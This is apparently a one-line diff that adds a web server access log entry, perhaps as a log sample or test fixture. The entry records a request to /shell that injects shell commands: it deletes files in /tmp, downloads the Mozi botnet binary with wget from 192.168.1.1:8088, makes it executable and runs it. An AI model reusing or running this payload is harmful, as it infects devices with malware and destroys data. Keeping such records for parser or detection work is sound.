@@ -1,0 +1,1 @@
+91.234.62.30 - - [02/Apr/2020:14:12:13 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
